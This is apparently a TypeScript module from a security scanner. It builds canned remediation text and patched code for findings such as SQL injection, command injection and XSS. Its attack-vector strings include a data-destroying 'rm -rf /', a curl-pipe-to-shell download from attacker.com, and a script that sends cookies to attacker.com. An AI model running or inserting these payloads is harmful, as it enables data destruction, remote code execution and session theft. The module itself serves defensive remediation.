import type { SecurityFinding } from '../types';

export interface AIFixResult {
  findingId: string;
  explanation: string;
  attackVector: string;
  patchedCode: string;
  diffSummary: string;
  securityImpact: string;
}

export function generateAIFix(finding: SecurityFinding): AIFixResult {
  let explanation = '';
  let attackVector = '';
  let patchedCode = finding.fixedSnippet || finding.snippet;
  let diffSummary = '';
  let securityImpact = '';

  switch (finding.category) {
    case 'SECRET_EXPOSURE':
      explanation = `Hardcoding plain-text credentials in ${finding.filePath} poses severe security risks. Once committed into version control, keys remain accessible in git commit history forever unless purged.`;
      attackVector = `Attacker mines public GitHub repositories or unencrypted server builds using automated regex bots to steal credentials.`;
      patchedCode = finding.fixedSnippet || `// Loaded from environment variable\nconst secretKey = process.env.SECRET_KEY;`;
      diffSummary = `- Hardcoded credential literal removed\n+ Replaced with environment variable runtime reference`;
      securityImpact = `Prevents credential leakage, complies with PCI-DSS & SOC2 compliance controls.`;
      break;

    case 'SQL_INJECTION':
      explanation = `Constructing SQL queries using string concatenation allows untrusted input from req.query or req.body to alter query execution logic.`;
      attackVector = `' OR '1'='1' -- injected via user parameter leads to full database dump or authentication bypass.`;
      patchedCode = finding.fixedSnippet || `const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);`;
      diffSummary = `- Interpolated SQL string removed\n+ Converted to parameterized query array parameters`;
      securityImpact = `Completely eliminates SQL Injection risk by treating inputs strictly as literal parameters.`;
      break;

    case 'COMMAND_INJECTION':
      explanation = `Passing dynamic arguments directly into system command shell execution (exec / os.system) permits command chaining.`;
      attackVector = `; rm -rf / or ; curl http://attacker.com/malware.sh | sh appended to parameter.`;
      patchedCode = finding.fixedSnippet || `execFile('/bin/ls', [safeDirArgument]);`;
      diffSummary = `- Shell execution wrapper removed\n+ Replaced with execFile / parameterized argument array`;
      securityImpact = `Prevents Remote Code Execution (RCE) vulnerabilities.`;
      break;

    case 'XSS':
      explanation = `Rendering raw HTML string content directly into the DOM allows malicious JavaScript scripts to execute within the victim's browser context.`;
      attackVector = `<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>`;
      patchedCode = finding.fixedSnippet || `<div>{DOMPurify.sanitize(userContent)}</div>`;
      diffSummary = `- Direct unsafe innerHTML assignment removed\n+ Added HTML DOM sanitization wrapper`;
      securityImpact = `Protects users against session hijacking and cookie theft.`;
      break;

    case 'INSECURE_DESERIALIZATION':
      explanation = `Executing eval() or unsafe deserializers parses input as live code instructions.`;
      attackVector = `Crafted JSON/Pickle payload containing arbitrary function execution instructions.`;
      patchedCode = finding.fixedSnippet || `const parsedData = JSON.parse(safePayloadString);`;
      diffSummary = `- Dynamic eval / pickle unsafe function call removed\n+ Replaced with safe JSON parser`;
      securityImpact = `Prevents arbitrary code execution on backend servers.`;
      break;

    default:
      explanation = `The pattern in ${finding.filePath} violates secure coding best practices (${finding.cwe}).`;
      attackVector = `Exploitation of weak configuration or component flaw.`;
      patchedCode = finding.fixedSnippet || finding.snippet;
      diffSummary = `Security remediation applied according to ${finding.owasp}`;
      securityImpact = `Elevates overall system resilience against automated exploit toolkits.`;
      break;
  }

  return {
    findingId: finding.id,
    explanation,
    attackVector,
    patchedCode,
    diffSummary,
    securityImpact
  };
}
